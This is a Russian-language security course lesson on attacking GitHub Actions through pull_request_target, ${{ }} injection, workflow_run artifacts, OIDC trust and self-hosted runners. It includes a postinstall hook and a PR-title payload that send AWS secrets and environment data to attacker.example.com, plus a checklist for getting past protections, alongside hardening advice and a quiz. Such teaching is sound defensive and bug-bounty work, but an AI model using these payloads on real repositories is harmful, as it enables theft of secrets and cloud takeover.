---
id: cloud-github-actions-pwn
title: "GitHub Actions pwn-requests: pull_request_target и инъекции"
category: cloud
parent: cloud-cicd-deep
difficulty: expert
order: 3
tags: [cloud, github-actions, pwn-request, workflow-injection, oidc, secrets, pr]
prerequisites: [cloud-cicd-deep, cloud-cicd-github-actions]
useful_for:
  - "Атаки на GitHub Actions публичных репозиториев"
  - "Кража облачных кредов через CI"
  - "Bug bounty: workflow injection"
estimated_minutes: 55
summary: "GitHub Actions: pull_request_target, workflow_run, issue_comment и инъекции в ${{ }}. Как из PR из форка получить секреты и токены облака (OIDC)."
---

## Зачем этот урок

GitHub Actions — самый распространённый CI/CD для open-source и многих компаний. Здесь есть уникальный класс уязвимостей: **pwn-requests** — запуск workflow с секретами на коде из недоверенного PR. Если workflow использует `pull_request_target` и чекаутит код PR, злоумышленник из форка выполняет произвольный код с доступом к секретам и `GITHUB_TOKEN`. Плюс инъекции в `${{ }}` (например, в `run: echo "${{ github.event.pull_request.title }}"`) позволяют выполнить команды через подконтрольные поля. Это один из самых частых векторов получения облачных кредов.

## Модель GitHub Actions

- **Workflow** — `.github/workflows/*.yml`; триггеры: `push`, `pull_request`, `pull_request_target`, `workflow_run`, `issue_comment`, `workflow_dispatch`.
- **`pull_request`** — из форка НЕ имеет секретов; `GITHUB_TOKEN` read-only.
- **`pull_request_target`** — запускается в контексте базовой ветки, имеет секреты, даже для PR из форка. Опасен, если чекаутит код PR.
- **`workflow_run`** — запускается после другого workflow; может иметь секреты, но работать с артефактами PR.
- **`issue_comment`** — срабатывает на комментарии; подконтрольный текст может попасть в `run`.
- **GITHUB_TOKEN** — автоматический токен; права задаются `permissions`.
- **OIDC** — `id-token: write` позволяет получить облачные креды без секретов (AWS/GCP/Azure).

## Инструменты и команды

```bash
# Ищем уязвимые workflow в репозитории
grep -rn "pull_request_target" .github/workflows/
grep -rn "workflow_run" .github/workflows/
grep -rnE 'run:.*\$\{\{' .github/workflows/   # потенциальные инъекции
grep -rn "actions/checkout" .github/workflows/

# Клонируем и анализируем
gh repo clone org/repo && cd repo
gh workflow list
gh run list --limit 10
```

## Разобранный пример: pull_request_target → секреты

Сценарий: workflow `build.yml` использует `pull_request_target` и чекаутит head PR.

```yaml
# .github/workflows/build.yml (жертва)
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # <-- опасно
      - run: npm install && npm test
```

Атакующий из форка меняет `package.json` (postinstall) или скрипт, и при запуске получает секреты.

```json
// package.json в PR из форка
{ "scripts": { "postinstall": "curl -X POST http://attacker.example.com/x -d \"$AWS_SECRET_ACCESS_KEY $(cat $AWS_WEB_IDENTITY_TOKEN_FILE 2>/dev/null)\"" } }
```

```bash
# Создаём PR из форка с вредоносным package.json
git clone https://github.com/attacker/repo && cd repo
# меняем package.json
git commit -am "fix" && git push
gh pr create --repo org/repo --head attacker:main --title "fix"
# workflow запускается с секретами, exfil на наш сервер
```

Получаем секреты репозитория и, если настроен OIDC (`id-token: write`), — временные облачные креды.

## Инъекции в ${{ }}

Если подконтрольное поле (title, body, branch name, commit message) попадает в `run`, `script` или `if`, можно внедрить команду.

```yaml
- run: echo "PR: ${{ github.event.pull_request.title }}"
# title = "; curl http://attacker/x -d $(env | base64) ;"
```

Контексты, которые контролирует атакующий: `github.event.pull_request.title/body/head.ref`, `github.event.issue.title/body`, `github.event.comment.body`, `github.head_ref`, `github.event.commits[].message`.

## OIDC и захват облака

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/GitHubActions
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

Если trust policy принимает `token.actions.githubusercontent.com:sub` без ограничения по `repo:org/repo:ref:refs/heads/main`, то PR из форка или другая ветка может принять роль. Проверяйте условие `sub` — оно должно жёстко привязывать репозиторий и ref.

## Чек-лист атаки

1. Искать `pull_request_target` + checkout PR.
2. Искать `workflow_run` + обработку артефактов PR.
3. Искать инъекции `${{ }}` в `run`.
4. Проверить `permissions` (id-token, contents).
5. Проверить trust policy OIDC на слабое условие.
6. Проверить `issue_comment` workflow.
7. Проверить self-hosted runners (PR может попасть на раннер).

## Обход защит и edge cases

- **Approval for fork PR.** Некоторые репозитории требуют approval; тогда нужен другой путь (issue_comment, workflow_run).
- **Environment protection.** Secrets в environment требуют approval; проверяйте, какие secrets в repo, а какие в environment.
- **permissions: read-only.** Ограничивает GITHUB_TOKEN, но secrets/OIDC всё равно доступны.
- **Fork restrictions.** `pull_request_target` работает из форка; иногда настройка требует, чтобы fork был в той же организации.
- **Pinned actions.** SHA-pinning не мешает pwn-request.
- **CodeQL/SAST.** Может поймать инъекции в workflow; учитывайте.

## Частые ошибки и подводные камни

- Считать `pull_request_target` безопасным «потому что секреты только для main».
- Игнорировать `workflow_run` как путь с секретами.
- Не проверять `${{ }}` инъекции.
- Забыть про OIDC trust policy.
- Не проверить self-hosted runners.

## Защита и детект

- Не использовать `pull_request_target` с checkout кода PR; для недоверенного кода — `pull_request`.
- Не подставлять `${{ }}` в `run`; использовать `env:` и quoting.
- Минимизировать `permissions`; не давать `id-token: write` без нужды.
- Жёстко ограничивать OIDC `sub` (repo + ref).
- Требовать approval для fork PR; изолировать self-hosted runners.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — `pull_request_target` + checkout PR. Второй — инъекция в `run`. Третий — широкий OIDC trust. Четвёртый — секреты в workflow, доступном PR. Пятый — self-hosted runner без изоляции. Все ведут к краже кредов.

## Практическое задание

1. В тестовом репозитории создайте `pull_request_target` + checkout и продемонстрируйте exfil из форка.
2. Исправьте на `pull_request` и проверьте, что секретов нет.
3. Настройте OIDC trust с ограничением `sub` по repo/ref и проверьте отказ для форка.
4. Проверьте инъекцию через title и исправьте через `env:`.

## Что дальше / решение

Из GitHub Actions получаем секреты и облачные креды. Дальше — использовать их в облаке. Зафиксируйте путь «PR → workflow → секреты/OIDC → облако» в графе. Если approval блокирует fork PR — ищите `workflow_run`/`issue_comment` или self-hosted runner.

## Разобранный пример 2: workflow_run и артефакты

`workflow_run` запускается после завершения другого workflow и часто имеет секреты. Если он обрабатывает артефакты из недоверенного workflow, вы можете внедрить вредоносный артефакт.

```yaml
# .github/workflows/privileged.yml (жертва)
on:
  workflow_run:
    workflows: ["build"]
    types: [completed]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: build-output }
      - run: ./deploy.sh build-output/     # исполняет наш артефакт
```

Атакующий в PR меняет workflow `build`, чтобы загрузить подконтрольный артефакт, который затем исполняется в `workflow_run` с секретами. Проверяйте такие цепочки: `workflow_run` + download-artifact + исполнение содержимого. Также `issue_comment` workflow, исполняющие команды из комментария, дают RCE любому, кто может комментировать.

## Self-hosted runners и изоляция

Если workflow запускается на self-hosted runner, PR из форка может попасть на машину в вашей сети.

```bash
# Определяем, self-hosted ли runner
# runs-on: [self-hosted, linux, x64]
# В PR-коде можно выполнить:
whoami; hostname; ip a; env | sort
ls ~/.aws ~/.azure ~/.config/gcloud 2>/dev/null
cat /etc/hosts
```

На self-hosted runner часто остаются кеши других job'ов, креды, `.env`, SSH-ключи. Даже если secrets недоступны, сам раннер — точка входа в сеть. Проверяйте `runs-on` в workflow: `ubuntu-latest` — hosted (изолирован), а `self-hosted` — нет. Некоторые организации разрешают fork PR на self-hosted без approval — это критично.

## Квиз

```quiz
- question: "Чем pull_request_target опасен?"
  options:
    - "Запускается с секретами базовой ветки даже для PR из форка"
    - "Не имеет секретов"
    - "Работает только на push"
    - "Шифрует код"
  answer: 0
  explanation: "В отличие от pull_request, он имеет доступ к секретам и широкому GITHUB_TOKEN."
- question: "Что нужно, чтобы получить облачные креды через OIDC?"
  options:
    - "Разрешение id-token: write и слабое условие sub в trust policy"
    - "Только contents: read"
    - "SSH-ключ"
    - "Пароль"
  answer: 0
  explanation: "id-token: write позволяет обменять OIDC-токен на облачные креды."
- question: "Какой контекст контролирует атакующий в инъекции?"
  options:
    - "github.event.pull_request.title/body/head.ref"
    - "github.sha"
    - "runner.os"
    - "job.status"
  answer: 0
  explanation: "Поля PR подконтрольны автору PR."
- question: "Почему workflow_run — путь с секретами?"
  options:
    - "Он запускается после другого workflow и может иметь секреты, работая с артефактами PR"
    - "Он не имеет секретов"
    - "Он только для push"
    - "Он шифрует"
  answer: 0
  explanation: "workflow_run может доверять артефактам недоверенного workflow."
```

## Где пригодится

- **Bug bounty:** pwn-requests в публичных репозиториях.
- **Red team:** кража облачных кредов через CI.
- **Blue team:** hardening workflows.
- **Supply chain:** компрометация сборки.
